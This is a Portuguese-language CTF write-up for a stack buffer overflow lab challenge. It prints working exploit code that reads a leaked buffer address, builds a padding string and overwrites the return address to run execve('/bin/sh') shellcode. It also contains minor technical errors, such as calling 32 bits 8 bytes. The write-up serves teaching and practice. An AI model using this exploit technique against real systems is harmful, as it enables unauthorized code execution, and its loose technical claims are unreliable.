# CTF - WEEK 8[](url)

## Challenge #2

- Tendo uma stack com permissão de execução e um buffer overflow. O que é será que se pode fazer?

1. Ao executar o ficheiro "program" (usando o _checksec_), podemos verificar que este imprime na shell o endereço da variável buffer. Iremos usar este valor mais tarde.

![Terminal print - buffer address](CTFs/Img/Semana8-Desafio2/1.bufferAddress.png)

2. Ao usar o ficheiro "exploit-example.py" de outros CTFs, podemos adaptar o mesmo para que funcione no CTF desta semana.

3. Explicação de código (do ficheiro "exploit-example.py"):

- 3.1. Começamos por retirar o valor do endereço do buffer que foi impresso no passo 1) (usamos Regex para obter o endereço de memória).

```py
txt = p.recvuntil(b":").decode()
addr = re.search('0x(.+?).\n', txt).group(1)
```

- 3.2. Transformar o código hexadecimal (corresponde à shell) num array de bytes.

```py
buf = bytearray.fromhex(addr)
buf.reverse()
```

- 3.3. Criar o frame pointer (váriavel "fp"). Sabemos que o frame pointer encontra-se na stack logo a seguir às variáveis locais. Este também tem um tamanho de 32 bits (ou 8 bytes) (o tamanho do frame pointer depende da arquitetura da máquina). Sendo assim, criamos um número hexadecimal constituído por oito 0's em hexadecimal.

```py
shellcode = bytearray.fromhex("31c050682f2f7368682f62696e89e3505389e1b00bcd80")
fp = bytearray.fromhex("0"*8)
```

- 3.4. Criar a "string" final que será enviada para o exploit.

```py
finalString = b"a"*77 + fp*2 + buf
```

- 3.5. Mandar esta string para a shellcode. Para conseguirmos fazer isso teremos de colocar a string a seguir ao código hexadecimal referente à shell.

```py
p.sendline(shellcode + finalString)
```

### Conclusão

Tentamos fazer overwrite do endereço de retorno da função colocando o código referente à shellcode (shellcode). Quando este retornar este enderenço na função, vai executar o código que estiver nesse endereço, ou seja, vai executar as instruções na shellcode (mas em código).
